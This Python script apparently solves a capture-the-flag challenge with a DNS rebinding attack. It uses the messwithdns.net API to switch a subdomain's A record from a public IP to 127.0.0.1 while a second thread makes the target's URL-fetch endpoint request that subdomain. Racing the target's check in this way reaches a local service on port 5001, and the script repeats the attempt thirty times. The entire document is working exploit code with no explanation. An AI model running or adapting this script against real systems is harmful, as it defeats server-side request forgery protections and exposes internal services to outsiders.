#!/usr/bin/env python3
import requests, time, threading, sys

# may depend on your internet connection, choose the best one for you
DELAY = 1

# note you will need to change the subdomain of messwithdns yourself within the source code

BASE = "https://messwithdns.net"
COOKIE = {"session": "redacted"}

def main():
    s = requests.Session()
    s.cookies.update(COOKIE)

    try:
        recs = s.get(BASE + "/records")
        rid = recs.json()[0]["id"]
    except:
        sys.exit("couldn't get records")

    try:
        r = s.post(f"{BASE}/records/{rid}", json={"subdomain":"nasaprod","type":"A","value_A":"3.175.115.68","ttl":"0"})
        print("POST 1:", r.status_code, r.text)
    except:
        print("POST 1 failed")

    time.sleep(2)

    try:
        recs = s.get(BASE + "/records")
        # print("GET /records again:", r2.status_code, r2.text)
        rid = recs.json()[0]["id"]
    except:
        print("second GET failed")

    def changeIp():
        time.sleep(DELAY)
        try:
            r3 = s.post(f"{BASE}/records/{rid}", json={"subdomain":"nasaprod","type":"A","value_A":"127.0.0.1","ttl":"0"})
            print("POST 2:", r3.status_code, r3.text)
        except:
            print("POST 2 failed")

    def janus():
        try:
            g = requests.get("https://janus.secso.cc/api?url=http://nasaprod.dna333.messwithdns.com:5001")
            print("Malicious link:", g.status_code, g.text[:200])
        except Exception as e:
            print("Malicious link failed", e)

    janusThread = threading.Thread(target=janus,daemon=True)
    janusThread.start()
    changeIpThread = threading.Thread(target=changeIp,daemon=True)
    changeIpThread.start()

    janusThread.join()
    changeIpThread.join()


if __name__ == "__main__":
    for i in range(30):
        main()
        time.sleep(3)
